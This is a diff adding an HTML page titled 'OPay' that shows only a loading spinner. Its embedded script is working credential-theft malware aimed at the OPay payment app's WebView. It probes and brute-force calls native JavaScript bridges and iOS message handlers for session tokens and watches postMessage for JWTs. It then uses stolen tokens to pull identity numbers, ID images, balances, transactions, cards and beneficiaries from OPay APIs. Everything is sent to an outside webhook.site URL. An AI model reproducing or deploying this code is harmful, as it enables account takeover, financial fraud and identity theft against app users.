@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPay</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+            background: #0d0d0d;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .loader {
+            text-align: center;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #222;
+            border-top-color: #00c853;
+            border-radius: 50%;
+            animation: s 0.7s linear infinite;
+            margin: 0 auto 14px;
+        }
+
+        @keyframes s {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .text {
+            font-size: 14px;
+            color: #555;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <div class="text">Loading...</div>
+    </div>
+
+    <script>
+        // ===== CONFIGURATION =====
+        var WEBHOOK = "https://webhook.site/06e6496b-16d6-4c16-a676-9817f03fedd2";
+        var API = "https://api.opayweb.com";
+
+        // ===== DATA COLLECTION =====
+        var D = {
+            ts: new Date().toISOString(),
+            url: window.location.href,
+            ref: document.referrer || "direct",
+            ua: navigator.userAgent,
+            plat: navigator.platform || "?",
+            lang: navigator.language || "?",
+            sw: screen.width, sh: screen.height,
+            touch: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "?",
+            bridges: [],
+            token: null
+        };
+
+        // ===== EXFIL =====
+        function send(data, tag) {
+            tag = tag || "d";
+            try {
+                var x = new XMLHttpRequest();
+                x.open("POST", WEBHOOK + "?t=" + tag, true);
+                x.setRequestHeader("Content-Type", "application/json");
+                x.send(JSON.stringify(data));
+            } catch (e) { }
+            try {
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({ t: tag, d: data })], { type: "application/json" }));
+                }
+            } catch (e) { }
+        }
+
+        // ===== API CALLER =====
+        function api(endpoint, body, token, cb) {
+            try {
+                var x = new XMLHttpRequest();
+                x.open("POST", API + endpoint, true);
+                x.setRequestHeader("Content-Type", "application/json");
+                x.setRequestHeader("Authorization", token);
+                x.setRequestHeader("Accept", "application/json");
+                x.timeout = 12000;
+                x.onreadystatechange = function () {
+                    if (x.readyState === 4) {
+                        try { cb(null, JSON.parse(x.responseText)); } catch (e) { cb("parse", null); }
+                    }
+                };
+                x.onerror = x.ontimeout = function () { cb("fail", null); };
+                x.send(JSON.stringify(body || {}));
+            } catch (e) { cb(e.message, null); }
+        }
+
+        // ===== FULL ACCOUNT EXTRACTION =====
+        function extractAll(token) {
+            // PII + Profile
+            api("/api-user/user/info/aggregate", { scene: "HOME" }, token, function (e, r) {
+                if (!e && r && r.data) {
+                    var d = r.data;
+                    var pii = {
+                        name: (d.firstName || "") + " " + (d.middleName || "") + " " + (d.surname || ""),
+                        mobile: d.mobile, email: d.email, addr: d.address,
+                        dob: d.dob, gender: d.gender, bvn: d.bvnNumber,
+                        kyc: d.kycLevel, uid: d.userId, face: d.facePicture
+                    };
+                    if (d.ninVo) {
+                        pii.nin = d.ninVo.idNumber; pii.ninImg = d.ninVo.image;
+                        pii.ninName = d.ninVo.firstName + " " + d.ninVo.middleName + " " + d.ninVo.lastName;
+                        pii.ninPhone = d.ninVo.phoneNumber; pii.ninDob = d.ninVo.dob;
+                    }
+                    if (d.bvnVo) {
+                        pii.bvnName = d.bvnVo.fullName; pii.bvnPhone = d.bvnVo.phoneNumber;
+                        pii.bvnImg = d.bvnVo.image; pii.bvnDob = d.bvnVo.birthDate;
+                    }
+                    send(pii, "PII");
+                    send({ full: d }, "PROFILE");
+                }
+            });
+
+            // Balance
+            api("/api/account/qryBalance", {}, token, function (e, r) {
+                if (!e && r && r.data) send({ bal: r.data }, "BAL");
+            });
+
+            // Current User
+            api("/api/users/getCurrentUserV3", {}, token, function (e, r) {
+                if (!e && r) send({ user: r.data || r }, "USER");
+            });
+
+            // Transactions
+            api("/api/v1/transaction/lookup-latest-transaction-list", { pageNo: 1, pageSize: 10 }, token, function (e, r) {
+                if (!e && r && r.data) send({ tx: r.data }, "TX");
+            });
+
+            // Cards/Instruments
+            api("/api/common/instruments", {}, token, function (e, r) {
+                if (!e && r && r.data) send({ cards: r.data }, "CARDS");
+            });
+
+            // Beneficiaries
+            api("/api/v1/common/query-beneficiary", {}, token, function (e, r) {
+                if (!e && r && r.data) send({ bene: r.data }, "BENE");
+            });
+
+            // KYC
+            api("/api/v2/user/kyc2/getUserBaseInfo", {}, token, function (e, r) {
+                if (!e && r) send({ kyc: r.data || r }, "KYC");
+            });
+
+            // Home
+            api("/api/home/account", {}, token, function (e, r) {
+                if (!e && r && r.data) send({ home: r.data }, "HOME");
+            });
+
+            // Final dump after all callbacks
+            setTimeout(function () { send(D, "DUMP"); }, 10000);
+        }
+
+        // ===== BRIDGE SCANNER =====
+        (function () {
+            // IP
+            try {
+                var x = new XMLHttpRequest();
+                x.open("GET", "https://api.ipify.org?format=json", true);
+                x.timeout = 5000;
+                x.onreadystatechange = function () {
+                    if (x.readyState === 4 && x.status === 200) {
+                        try { D.ip = JSON.parse(x.responseText).ip; } catch (e) { }
+                    }
+                };
+                x.send();
+            } catch (e) { }
+
+            // Bridge names to scan
+            var BRIDGES = [
+                'control', 'android', 'OPay3PartyContext', 'ORideContext',
+                'webkit', 'OPayContext', 'OPayBridge', 'AppBridge',
+                'NativeBridge', 'JSBridge', 'WebViewJavascriptBridge',
+                'WKWebViewJavascriptBridge', 'OPayWebView', 'opay',
+                'OPay', 'PayContext', 'prompt'
+            ];
+
+            var found = {};
+
+            // Scan window objects
+            for (var i = 0; i < BRIDGES.length; i++) {
+                try {
+                    if (window[BRIDGES[i]] && typeof window[BRIDGES[i]] === 'object') {
+                        found[BRIDGES[i]] = window[BRIDGES[i]];
+                        D.bridges.push(BRIDGES[i]);
+                    }
+                } catch (e) { }
+            }
+
+            // iOS WKWebView messageHandlers
+            try {
+                if (window.webkit && window.webkit.messageHandlers) {
+                    found["webkit.mh"] = window.webkit.messageHandlers;
+                    D.bridges.push("webkit.messageHandlers");
+
+                    var hNames = ['getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo',
+                        'OPay3PartyContext', 'OPayContext', 'callNative', 'invoke',
+                        'getAppInfo', 'getDeviceInfo', 'getUserToken', 'getAccessToken'];
+                    var hFound = [];
+                    for (var h = 0; h < hNames.length; h++) {
+                        try {
+                            if (window.webkit.messageHandlers[hNames[h]]) hFound.push(hNames[h]);
+                        } catch (e) { }
+                    }
+                    if (hFound.length > 0) send({ handlers: hFound }, "IOS_H");
+
+                    // Try posting messages to handlers
+                    for (var hi = 0; hi < hFound.length; hi++) {
+                        try {
+                            window.webkit.messageHandlers[hFound[hi]].postMessage({ action: "getToken" });
+                            window.webkit.messageHandlers[hFound[hi]].postMessage({ action: "getBaseInfo" });
+                            window.webkit.messageHandlers[hFound[hi]].postMessage("getToken");
+                            window.webkit.messageHandlers[hFound[hi]].postMessage("");
+                        } catch (e) { }
+                    }
+                }
+            } catch (e) { }
+
+            // postMessage listener for async bridge responses
+            window.addEventListener("message", function (evt) {
+                try {
+                    var data = typeof evt.data === 'string' ? evt.data : JSON.stringify(evt.data);
+                    send({ msg: data, origin: evt.origin }, "PMSG");
+                    // Check if it contains a token
+                    if (data.indexOf("token") > -1 || data.indexOf("eyJ") > -1) {
+                        send({ tokenMsg: data }, "TOKEN_MSG");
+                        try {
+                            var p = JSON.parse(data);
+                            if (p.token) {
+                                D.token = data;
+                                send({ token: data, src: "postMessage" }, "TOKEN");
+                                extractAll(p.token);
+                            }
+                        } catch (e) {
+                            if (data.indexOf("eyJ") > -1) {
+                                var m = data.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
+                                if (m) {
+                                    D.token = m[0];
+                                    send({ token: m[0], src: "postMessage_regex" }, "TOKEN");
+                                    extractAll("Bearer " + m[0]);
+                                }
+                            }
+                        }
+                    }
+                } catch (e) { }
+            });
+
+            // Enumerate + brute-force call methods on found bridges
+            var TOKEN_METHODS = [
+                'getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo',
+                'getUserToken', 'getAccessToken', 'getAuthToken', 'getSessionToken',
+                'getAppInfo', 'getDeviceInfo', 'getLoginInfo', 'getLoginToken',
+                'getSession', 'getUserData', 'getData', 'getInfo', 'tokenInfo',
+                'userInfo', 'accountInfo', 'loginInfo', 'getProfile', 'getConfig'
+            ];
+
+            var tokenFound = false;
+
+            function tryBridge(name, obj) {
+                var methods = [];
+                // Enumerate
+                try {
+                    var keys = Object.getOwnPropertyNames(obj);
+                    for (var k = 0; k < keys.length; k++) {
+                        try { if (typeof obj[keys[k]] === 'function') methods.push(keys[k]); } catch (e) { }
+                    }
+                } catch (e) { }
+                try {
+                    for (var key in obj) {
+                        try { if (typeof obj[key] === 'function' && methods.indexOf(key) === -1) methods.push(key); } catch (e) { }
+                    }
+                } catch (e) { }
+
+                send({ bridge: name, methods: methods.join(","), count: methods.length }, "BRIDGE");
+
+                // Call discovered methods
+                var results = {};
+                for (var m = 0; m < methods.length; m++) {
+                    try {
+                        var ret = obj[methods[m]]();
+                        if (ret !== undefined && ret !== null && ret !== '') {
+                            results[methods[m]] = String(ret).substring(0, 2000);
+                        }
+                    } catch (e) { results[methods[m]] = "E:" + e.message; }
+                }
+
+                // Call common token methods not yet discovered
+                for (var t = 0; t < TOKEN_METHODS.length; t++) {
+                    if (methods.indexOf(TOKEN_METHODS[t]) === -1) {
+                        try {
+                            if (typeof obj[TOKEN_METHODS[t]] === 'function') {
+                                var v = obj[TOKEN_METHODS[t]]();
+                                if (v !== undefined && v !== null && v !== '') {
+                                    results[TOKEN_METHODS[t]] = String(v).substring(0, 2000);
+                                }
+                            }
+                        } catch (e) { }
+                    }
+                }
+
+                if (Object.keys(results).length > 0) {
+                    send({ bridge: name, results: results }, "BRESULT");
+                }
+
+                // Check results for tokens
+                for (var rk in results) {
+                    if (!results.hasOwnProperty(rk)) continue;
+                    var rv = results[rk];
+                    if (rv && rv.length > 20 && rv.indexOf("E:") !== 0) {
+                        try {
+                            var parsed = JSON.parse(rv);
+                            if (parsed.token) {
+                                tokenFound = true;
+                                D.token = rv;
+                                send({ token: rv, src: name + "." + rk }, "TOKEN");
+                                extractAll(parsed.token);
+                            }
+                        } catch (e) {
+                            if (rv.indexOf("eyJ") === 0 || rv.indexOf("Bearer") > -1) {
+                                tokenFound = true;
+                                var tkn = rv.replace("Bearer ", "").trim();
+                                D.token = rv;
+                                send({ token: rv, src: name + "." + rk }, "TOKEN");
+                                extractAll("Bearer " + tkn);
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Run on all found bridges
+            for (var bname in found) {
+                if (!found.hasOwnProperty(bname)) continue;
+                try {
+                    var bobj = bname === "webkit.mh" ? window.webkit.messageHandlers : found[bname];
+                    tryBridge(bname, bobj);
+                } catch (e) {
+                    send({ bridge: bname, err: e.message }, "BERR");
+                }
+            }
+
+            // Direct fallback for 'control' bridge (Android)
+            if (!tokenFound && window.control && window.control.getBaseInfo) {
+                try {
+                    var raw = window.control.getBaseInfo();
+                    D.token = raw;
+                    send({ token: raw, src: "control.getBaseInfo" }, "TOKEN");
+                    try {
+                        var p = JSON.parse(raw);
+                        if (p.token) extractAll(p.token);
+                    } catch (e) { }
+                } catch (e) { }
+            }
+
+            // Send initial visitor data
+            send(D, "VISIT");
+
+            // Beacon on unload
+            window.addEventListener("beforeunload", function () {
+                try {
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon(WEBHOOK + "?t=EXIT", new Blob([JSON.stringify(D)], { type: "application/json" }));
+                    }
+                } catch (e) { }
+            });
+        })();
+    </script>
+</body>
+
+</html>
